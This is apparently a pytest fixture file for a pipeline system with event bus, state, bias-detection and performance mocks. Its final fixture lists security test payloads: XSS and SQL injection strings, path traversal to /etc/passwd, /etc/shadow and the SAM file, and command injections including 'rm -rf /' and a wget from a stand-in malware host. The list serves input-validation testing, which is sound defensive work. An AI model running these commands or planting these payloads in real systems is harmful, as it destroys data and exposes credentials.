"""
Test Configuration and Fixtures for Pipeline Communication Tests.

This module provides pytest fixtures and configuration for testing the
six-stage pipeline communication system with HIPAA++ compliance.
"""

import pytest
import asyncio
import json
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, MagicMock
from typing import Dict, Any, List, Optional

from ..event_bus import EventBus, EventMessage, EventType
from ..pipeline_coordinator import PipelineCoordinator, PipelineContext
from ..state_manager import StateManager, PipelineState, StageState
from ..progress_tracker import ProgressTracker, ProgressUpdate
from ..error_recovery import ErrorRecoveryManager, RecoveryStrategy, RecoveryResult
from ..bias_integration import BiasDetectionIntegration, BiasMetrics
from ..performance_monitor import PerformanceMonitor, PerformanceMetric
from ..graceful_degradation import GracefulDegradationManager, DegradationLevel
from ...integration.redis_client import RedisClient
from ...error_handling.custom_errors import (
    PipelineExecutionError, ValidationError, TimeoutError,
    BiasDetectionError, ServiceUnavailableError
)


@pytest.fixture(scope='session')
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def mock_redis_client():
    """Create a mock Redis client with async methods."""
    client = Mock(spec=RedisClient)
    
    # Mock async methods
    client.get = AsyncMock(return_value=None)
    client.setex = AsyncMock(return_value=True)
    client.set = AsyncMock(return_value=True)
    client.delete = AsyncMock(return_value=1)
    client.keys = AsyncMock(return_value=[])
    client.publish = AsyncMock(return_value=1)
    client.subscribe = AsyncMock()
    client.unsubscribe = AsyncMock()
    client.hget = AsyncMock(return_value=None)
    client.hset = AsyncMock(return_value=1)
    client.hdel = AsyncMock(return_value=1)
    client.hgetall = AsyncMock(return_value={})
    client.lpush = AsyncMock(return_value=1)
    client.lrange = AsyncMock(return_value=[])
    client.expire = AsyncMock(return_value=True)
    
    return client


@pytest.fixture
def test_config():
    """Provide test configuration for pipeline components."""
    return {
        'redis': {
            'connection_pool': {
                'max_connections': 10,
                'min_connections': 2,
                'connection_timeout': 5.0,
                'socket_timeout': 5.0
            },
            'key_prefix': 'test_pipeline',
            'state_ttl_seconds': 3600,
            'event_ttl': 3600
        },
        'event_bus': {
            'event_ttl': 3600,
            'guaranteed_delivery': True,
            'retry_attempts': 3,
            'retry_delay': 1.0
        },
        'pipeline': {
            'max_concurrent_executions': 10,
            'stage_timeout_seconds': 300,
            'overall_timeout_seconds': 1800,
            'quality_threshold': 0.8,
            'bias_detection_enabled': True
        },
        'performance': {
            'metrics_retention_hours': 24,
            'threshold_check_interval': 60,
            'performance_window_size': 1000,
            'sub_50ms_target': 0.95  # 95% of operations should be under 50ms
        },
        'security': {
            'encryption_enabled': True,
            'audit_logging_enabled': True,
            'rate_limiting_enabled': True,
            'max_requests_per_minute': 100
        },
        'bias_detection': {
            'enabled': True,
            'threshold': 0.3,
            'confidence_threshold': 0.7,
            'real_time_monitoring': True
        },
        'error_recovery': {
            'max_retry_attempts': 3,
            'retry_delay_seconds': 2.0,
            'exponential_backoff': True,
            'circuit_breaker_threshold': 5,
            'circuit_breaker_timeout': 60
        },
        'graceful_degradation': {
            'enabled': True,
            'degradation_levels': ['normal', 'reduced', 'minimal', 'emergency'],
            'circuit_breaker_enabled': True,
            'fallback_enabled': True
        }
    }


@pytest.fixture
async def event_bus(mock_redis_client, test_config):
    """Create EventBus instance for testing."""
    event_bus = EventBus(mock_redis_client, test_config['event_bus'])
    yield event_bus
    await event_bus.shutdown()


@pytest.fixture
async def state_manager(mock_redis_client, test_config):
    """Create StateManager instance for testing."""
    state_manager = StateManager(mock_redis_client, test_config['redis'])
    yield state_manager


@pytest.fixture
async def progress_tracker(mock_redis_client, event_bus, state_manager):
    """Create ProgressTracker instance for testing."""
    progress_tracker = ProgressTracker(mock_redis_client, event_bus, state_manager)
    yield progress_tracker


@pytest.fixture
async def error_recovery_manager(test_config):
    """Create ErrorRecoveryManager instance for testing."""
    error_recovery = ErrorRecoveryManager(test_config['error_recovery'])
    yield error_recovery


@pytest.fixture
async def bias_integration(test_config):
    """Create BiasDetectionIntegration instance for testing."""
    bias_integration = BiasDetectionIntegration(test_config['bias_detection'])
    await bias_integration.initialize_bias_service()
    yield bias_integration


@pytest.fixture
async def performance_monitor(mock_redis_client, test_config):
    """Create PerformanceMonitor instance for testing."""
    performance_monitor = PerformanceMonitor(mock_redis_client, test_config['performance'])
    yield performance_monitor


@pytest.fixture
async def graceful_degradation_manager(event_bus, test_config):
    """Create GracefulDegradationManager instance for testing."""
    degradation_manager = GracefulDegradationManager(event_bus, test_config['graceful_degradation'])
    yield degradation_manager


@pytest.fixture
async def pipeline_coordinator(mock_redis_client, test_config):
    """Create PipelineCoordinator instance for testing."""
    coordinator = PipelineCoordinator(mock_redis_client, test_config)
    yield coordinator


@pytest.fixture
def sample_pipeline_context():
    """Create sample pipeline context for testing."""
    return PipelineContext(
        execution_id="test_execution_123",
        user_id="test_user_123",
        dataset_ids=["dataset_1", "dataset_2"],
        execution_mode="standard",
        quality_threshold=0.8,
        enable_bias_detection=True,
        start_time=datetime.utcnow(),
        current_stage="ingestion",
        stage_results={},
        metadata={
            'test_run': True,
            'environment': 'test',
            'version': '1.0.0'
        }
    )


@pytest.fixture
def sample_event_message():
    """Create sample event message for testing."""
    return EventMessage(
        event_type=EventType.PROGRESS_UPDATE.value,
        execution_id="test_execution_123",
        payload={
            'stage': 'validation',
            'progress': 50.0,
            'status': 'running',
            'timestamp': datetime.utcnow().isoformat()
        },
        metadata={
            'source': 'test',
            'priority': 'normal',
            'correlation_id': 'test_correlation_123'
        }
    )


@pytest.fixture
def sample_bias_metrics():
    """Create sample bias metrics for testing."""
    return BiasMetrics(
        overall_bias_score=0.15,
        demographic_bias_score=0.1,
        content_bias_score=0.2,
        representation_bias_score=0.1,
        confidence_score=0.85,
        compliance_status="compliant",
        threshold_exceeded=False,
        recommendations=["Continue monitoring", "No immediate action required"],
        timestamp=datetime.utcnow()
    )


@pytest.fixture
def sample_performance_metric():
    """Create sample performance metric for testing."""
    return PerformanceMetric(
        metric_name="stage_execution_time",
        execution_id="test_execution_123",
        value=25.0,
        unit="milliseconds",
        timestamp=datetime.utcnow(),
        threshold=50.0,
        threshold_exceeded=False,
        metadata={'stage': 'validation', 'dataset_size': 1000}
    )


@pytest.fixture
def mock_handler():
    """Create a mock event handler for testing."""
    class MockHandler:
        def __init__(self, handler_func=None):
            self.handler_func = handler_func or self._default_handler
            self.call_count = 0
            self.received_events = []
        
        async def _default_handler(self, event: EventMessage) -> Dict[str, Any]:
            self.call_count += 1
            self.received_events.append(event)
            return {'handled': True, 'timestamp': datetime.utcnow().isoformat()}
        
        async def handle(self, event: EventMessage) -> Dict[str, Any]:
            return await self.handler_func(event)
    
    return MockHandler()


@pytest.fixture
def mock_stage_coordinator():
    """Create a mock stage coordinator for testing."""
    class MockStageCoordinator:
        def __init__(self, stage_name="test_stage"):
            self.stage_name = stage_name
            self.execute_count = 0
            self.last_context = None
        
        async def execute_stage(self, context: PipelineContext) -> Dict[str, Any]:
            self.execute_count += 1
            self.last_context = context
            
            # Simulate stage execution
            await asyncio.sleep(0.01)  # 10ms delay
            
            return {
                'stage_name': self.stage_name,
                'status': 'completed',
                'result': {'processed_items': 100, 'quality_score': 0.9},
                'execution_time_ms': 10.0,
                'timestamp': datetime.utcnow().isoformat()
            }
        
        async def validate_stage_input(self, context: PipelineContext) -> bool:
            return True
        
        async def get_stage_requirements(self) -> Dict[str, Any]:
            return {'required_data': ['input_data'], 'optional_data': ['metadata']}
    
    return MockStageCoordinator()


@pytest.fixture
def mock_bias_service():
    """Create a mock bias detection service for testing."""
    class MockBiasService:
        def __init__(self):
            self.analyze_count = 0
        
        async def analyze_data(self, data: Dict[str, Any], stage: str) -> BiasMetrics:
            self.analyze_count += 1
            
            # Simulate bias analysis
            bias_score = 0.1 if 'good' in str(data).lower() else 0.3
            
            return BiasMetrics(
                overall_bias_score=bias_score,
                demographic_bias_score=bias_score * 0.8,
                content_bias_score=bias_score * 1.2,
                representation_bias_score=bias_score * 0.9,
                confidence_score=0.85,
                compliance_status="compliant" if bias_score < 0.2 else "warning",
                threshold_exceeded=bias_score > 0.2,
                recommendations=["Monitor closely"] if bias_score > 0.2 else ["Continue"],
                timestamp=datetime.utcnow()
            )
        
        async def get_real_time_alerts(self) -> List[Dict[str, Any]]:
            return [
                {
                    'alert_type': 'bias_threshold_exceeded',
                    'bias_score': 0.35,
                    'threshold': 0.3,
                    'timestamp': datetime.utcnow().isoformat(),
                    'stage': 'validation'
                }
            ]
    
    return MockBiasService()


@pytest.fixture
def mock_performance_service():
    """Create a mock performance monitoring service for testing."""
    class MockPerformanceService:
        def __init__(self):
            self.metrics = []
        
        async def record_metric(self, metric: PerformanceMetric) -> PerformanceMetric:
            self.metrics.append(metric)
            return metric
        
        async def check_performance_thresholds(self) -> List[Dict[str, Any]]:
            violations = []
            for metric in self.metrics:
                if metric.threshold_exceeded:
                    violations.append({
                        'metric_name': metric.metric_name,
                        'current_value': metric.value,
                        'threshold': metric.threshold,
                        'violation_severity': 'high' if metric.value > metric.threshold * 1.5 else 'medium'
                    })
            return violations
        
        async def get_performance_summary(self, execution_id: str) -> Dict[str, Any]:
            execution_metrics = [m for m in self.metrics if m.execution_id == execution_id]
            
            if not execution_metrics:
                return None
            
            return {
                'execution_id': execution_id,
                'total_operations': len(execution_metrics),
                'average_response_time_ms': sum(m.value for m in execution_metrics) / len(execution_metrics),
                'min_response_time_ms': min(m.value for m in execution_metrics),
                'max_response_time_ms': max(m.value for m in execution_metrics),
                'threshold_violations': sum(1 for m in execution_metrics if m.threshold_exceeded),
                'sub_50ms_compliance_rate': sum(1 for m in execution_metrics if m.value <= 50.0) / len(execution_metrics)
            }
    
    return MockPerformanceService()


@pytest.fixture
def mock_web_socket_manager():
    """Create a mock WebSocket manager for testing."""
    class MockWebSocketManager:
        def __init__(self):
            self.connections = {}
            self.messages_sent = []
        
        async def connect(self, client_id: str, websocket):
            self.connections[client_id] = websocket
        
        async def disconnect(self, client_id: str):
            if client_id in self.connections:
                del self.connections[client_id]
        
        async def send_message(self, client_id: str, message: Dict[str, Any]):
            if client_id in self.connections:
                self.messages_sent.append({
                    'client_id': client_id,
                    'message': message,
                    'timestamp': datetime.utcnow().isoformat()
                })
                return True
            return False
        
        async def broadcast_message(self, message: Dict[str, Any]):
            for client_id in self.connections:
                await self.send_message(client_id, message)
        
        def get_connection_count(self) -> int:
            return len(self.connections)
    
    return MockWebSocketManager()


@pytest.fixture
def mock_flask_app():
    """Create a mock Flask app for testing."""
    class MockFlaskApp:
        def __init__(self):
            self.routes = {}
            self.before_request_handlers = []
            self.after_request_handlers = []
        
        def route(self, path, methods=None):
            def decorator(func):
                self.routes[path] = {
                    'function': func,
                    'methods': methods or ['GET']
                }
                return func
            return decorator
        
        def before_request(self, func):
            self.before_request_handlers.append(func)
            return func
        
        def after_request(self, func):
            self.after_request_handlers.append(func)
            return func
        
        async def test_request(self, path, method='GET', data=None, headers=None):
            if path not in self.routes:
                return {'status': 404, 'error': 'Route not found'}
            
            route_info = self.routes[path]
            if method not in route_info['methods']:
                return {'status': 405, 'error': 'Method not allowed'}
            
            # Mock request context
            mock_request = Mock()
            mock_request.method = method
            mock_request.path = path
            mock_request.headers = headers or {}
            mock_request.json = data or {}
            
            # Execute before request handlers
            for handler in self.before_request_handlers:
                await handler()
            
            # Execute route function
            try:
                result = await route_info['function'](mock_request)
                
                # Execute after request handlers
                for handler in self.after_request_handlers:
                    await handler()
                
                return {'status': 200, 'data': result}
            except Exception as e:
                return {'status': 500, 'error': str(e)}
    
    return MockFlaskApp()


@pytest.fixture
def test_data_generator():
    """Create test data generator for various scenarios."""
    class TestDataGenerator:
        @staticmethod
        def generate_dataset_metadata(size: int = 1000) -> Dict[str, Any]:
            return {
                'dataset_id': f'test_dataset_{int(time.time())}',
                'size': size,
                'created_at': datetime.utcnow().isoformat(),
                'last_modified': datetime.utcnow().isoformat(),
                'format': 'json',
                'schema': {
                    'fields': ['id', 'text', 'label', 'timestamp'],
                    'types': ['integer', 'string', 'string', 'datetime']
                },
                'quality_metrics': {
                    'completeness': 0.95,
                    'accuracy': 0.92,
                    'consistency': 0.88
                }
            }
        
        @staticmethod
        def generate_pipeline_request(num_datasets: int = 2) -> Dict[str, Any]:
            return {
                'dataset_ids': [f'dataset_{i}' for i in range(num_datasets)],
                'user_id': f'test_user_{int(time.time())}',
                'execution_mode': 'standard',
                'quality_threshold': 0.8,
                'enable_bias_detection': True,
                'metadata': {
                    'test_run': True,
                    'environment': 'test',
                    'version': '1.0.0'
                }
            }
        
        @staticmethod
        def generate_stage_result(stage_name: str, status: str = 'completed') -> Dict[str, Any]:
            return {
                'stage_name': stage_name,
                'status': status,
                'start_time': datetime.utcnow().isoformat(),
                'end_time': datetime.utcnow().isoformat(),
                'duration_ms': 100.0,
                'result': {
                    'processed_items': 100,
                    'quality_score': 0.9,
                    'errors': [],
                    'warnings': []
                },
                'metadata': {
                    'stage_version': '1.0.0',
                    'worker_id': 'test_worker_123'
                }
            }
        
        @staticmethod
        def generate_bias_metrics(bias_score: float = 0.1) -> BiasMetrics:
            return BiasMetrics(
                overall_bias_score=bias_score,
                demographic_bias_score=bias_score * 0.8,
                content_bias_score=bias_score * 1.2,
                representation_bias_score=bias_score * 0.9,
                confidence_score=0.85,
                compliance_status="compliant" if bias_score < 0.2 else "warning",
                threshold_exceeded=bias_score > 0.2,
                recommendations=["Monitor closely"] if bias_score > 0.2 else ["Continue"],
                timestamp=datetime.utcnow()
            )
        
        @staticmethod
        def generate_performance_metrics(execution_id: str, num_metrics: int = 5) -> List[PerformanceMetric]:
            metrics = []
            for i in range(num_metrics):
                metrics.append(PerformanceMetric(
                    metric_name=f'test_metric_{i}',
                    execution_id=execution_id,
                    value=float(i * 10),
                    unit='milliseconds',
                    timestamp=datetime.utcnow(),
                    threshold=50.0,
                    threshold_exceeded=(i * 10) > 50.0,
                    metadata={'test_index': i}
                ))
            return metrics
    
    return TestDataGenerator()


@pytest.fixture
def performance_timer():
    """Create performance timer for measuring execution times."""
    class PerformanceTimer:
        def __init__(self):
            self.start_time = None
            self.end_time = None
            self.elapsed_ms = None
        
        def start(self):
            self.start_time = time.time()
            self.end_time = None
            self.elapsed_ms = None
        
        def stop(self):
            if self.start_time is None:
                raise RuntimeError("Timer not started")
            self.end_time = time.time()
            self.elapsed_ms = (self.end_time - self.start_time) * 1000
        
        def get_elapsed_ms(self) -> float:
            if self.elapsed_ms is None:
                raise RuntimeError("Timer not stopped")
            return self.elapsed_ms
        
        def assert_under_threshold(self, threshold_ms: float = 50.0):
            elapsed = self.get_elapsed_ms()
            assert elapsed < threshold_ms, f"Operation took {elapsed:.2f}ms, exceeding {threshold_ms}ms threshold"
        
        def __enter__(self):
            self.start()
            return self
        
        def __exit__(self, exc_type, exc_val, exc_tb):
            self.stop()
    
    return PerformanceTimer()


@pytest.fixture
def mock_logger():
    """Create a mock logger for testing."""
    class MockLogger:
        def __init__(self):
            self.logs = {
                'debug': [],
                'info': [],
                'warning': [],
                'error': [],
                'critical': []
            }
        
        def debug(self, message: str, **kwargs):
            self.logs['debug'].append({'message': message, 'kwargs': kwargs})
        
        def info(self, message: str, **kwargs):
            self.logs['info'].append({'message': message, 'kwargs': kwargs})
        
        def warning(self, message: str, **kwargs):
            self.logs['warning'].append({'message': message, 'kwargs': kwargs})
        
        def error(self, message: str, **kwargs):
            self.logs['error'].append({'message': message, 'kwargs': kwargs})
        
        def critical(self, message: str, **kwargs):
            self.logs['critical'].append({'message': message, 'kwargs': kwargs})
        
        def get_logs(self, level: str = None):
            if level:
                return self.logs.get(level, [])
            return self.logs
        
        def clear_logs(self):
            for level in self.logs:
                self.logs[level] = []
    
    return MockLogger()


@pytest.fixture(autouse=True)
def reset_mocks():
    """Reset all mocks before each test."""
    yield
    # Reset any global state or mocks here
    pass


@pytest.fixture(scope='session')
def test_database():
    """Create test database configuration."""
    return {
        'host': 'localhost',
        'port': 6379,
        'database': 15,  # Use database 15 for tests
        'password': None,
        'ssl': False,
        'socket_timeout': 5.0,
        'connection_pool_size': 10
    }


@pytest.fixture(scope='session')
def test_environment():
    """Set up test environment variables."""
    import os
    
    # Set test environment variables
    os.environ['PIPELINE_TEST_MODE'] = 'true'
    os.environ['REDIS_TEST_DATABASE'] = '15'
    os.environ['LOG_LEVEL'] = 'DEBUG'
    
    yield
    
    # Cleanup environment variables
    if 'PIPELINE_TEST_MODE' in os.environ:
        del os.environ['PIPELINE_TEST_MODE']
    if 'REDIS_TEST_DATABASE' in os.environ:
        del os.environ['REDIS_TEST_DATABASE']
    if 'LOG_LEVEL' in os.environ:
        del os.environ['LOG_LEVEL']


# Pytest configuration
def pytest_configure(config):
    """Configure pytest for async testing."""
    config.addinivalue_line(
        "markers", "asyncio: mark test as async"
    )
    config.addinivalue_line(
        "markers", "performance: mark test as performance-critical"
    )
    config.addinivalue_line(
        "markers", "security: mark test as security-sensitive"
    )
    config.addinivalue_line(
        "markers", "hipaa: mark test as HIPAA compliance test"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on test names."""
    for item in items:
        # Auto-mark performance tests
        if "performance" in item.nodeid.lower():
            item.add_marker(pytest.mark.performance)
        
        # Auto-mark security tests
        if "security" in item.nodeid.lower() or "compliance" in item.nodeid.lower():
            item.add_marker(pytest.mark.security)
        
        # Auto-mark HIPAA tests
        if "hipaa" in item.nodeid.lower():
            item.add_marker(pytest.mark.hipaa)


# Async test configuration
@pytest.fixture(scope="session")
def asyncio_event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# Performance testing configuration
@pytest.fixture(scope="session")
def performance_thresholds():
    """Define performance thresholds for testing."""
    return {
        'event_publishing_ms': 50.0,
        'state_update_ms': 50.0,
        'bias_detection_ms': 50.0,
        'progress_update_ms': 50.0,
        'pipeline_stage_ms': 5000.0,  # 5 seconds per stage
        'overall_pipeline_ms': 30000.0  # 30 seconds total
    }


# Security testing configuration
@pytest.fixture(scope="session")
def security_test_cases():
    """Define security test cases for input validation."""
    return {
        'xss_payloads': [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            '<img src="x" onerror="alert(\'xss\')">'
        ],
        'sql_injection_payloads': [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "UNION SELECT * FROM users"
        ],
        'command_injection_payloads': [
            'rm -rf /',
            'cat /etc/passwd',
            'wget malicious.com/malware.sh'
        ],
        'path_traversal_payloads': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow'
        ]
    }